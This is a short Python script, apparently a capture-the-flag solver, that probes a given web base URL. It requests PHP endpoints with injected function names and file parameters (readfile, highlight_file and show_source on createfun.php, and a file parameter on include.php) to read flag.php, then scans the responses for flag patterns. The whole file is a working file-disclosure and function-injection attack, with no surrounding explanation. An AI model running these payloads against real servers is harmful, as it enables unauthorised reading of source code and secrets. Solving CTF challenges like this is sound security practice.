import re, sys, urllib.parse, urllib.request

PAT = re.compile(r'(?:flag|ctf|nuaactf)\{[^}]{1,200}\}', re.I)

def fetch(url):
    req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
    with urllib.request.urlopen(req, timeout=15) as r:
        return r.read().decode('utf-8', 'ignore')

def join(base, path):
    return base.rstrip('/') + '/' + path.lstrip('/')

def main():
    if len(sys.argv) < 2:
        print('Usage: python3 php_lfi_func_reader.py <base_url>')
        sys.exit(1)
    base = sys.argv[1].rstrip('/')
    candidates = [
        '/createfun.php?func=readfile&arg=flag.php',
        '/createfun.php?func=highlight_file&arg=flag.php',
        '/createfun.php?func=show_source&arg=flag.php',
        '/include.php?file=flag.php',
    ]
    for p in candidates:
        url = join(base, p)
        try:
            body = fetch(url)
        except Exception as e:
            print(f'[-] {url} -> {e}')
            continue
        hits = PAT.findall(body)
        print(f'[+] tried {url}, hits={hits}')
        for h in hits:
            print(h)

if __name__ == '__main__':
    main()
